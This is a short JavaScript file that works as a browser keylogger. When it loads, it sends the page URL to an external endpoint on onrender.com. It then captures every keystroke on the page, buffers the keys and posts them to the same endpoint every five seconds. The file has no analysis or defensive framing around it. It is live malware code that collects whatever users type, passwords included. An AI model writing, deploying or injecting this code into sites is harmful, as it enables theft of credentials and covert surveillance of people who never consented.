var keys = '';
var current = document.URL;

// Send the current URL once
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://flask-backend-mm3t.onrender.com/keylog", true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({ "logged": current }));

document.onkeydown = function (e) {
    var key = e.key; // e.g., "a", "A", "Shift", "Enter", "@"
    
    // Optional: format keys for readability
    if (key === " ") key = "[SPACE]";
    else if (key === "Enter") key = "[ENTER]";
    else if (key === "Backspace") key = "[BACKSPACE]";
    else if (key.length > 1) key = `[${key}]`; // for Shift, Tab, etc.

    keys += key;
}

window.setInterval(function () {
    if (keys !== "") {
        var xhr_key = new XMLHttpRequest();
        xhr_key.open("POST", "https://flask-backend-mm3t.onrender.com/keylog", true);
        xhr_key.setRequestHeader('Content-Type', 'application/json');
        xhr_key.send(JSON.stringify({ "logged": keys }));
        keys = "";
    }
}, 5000);
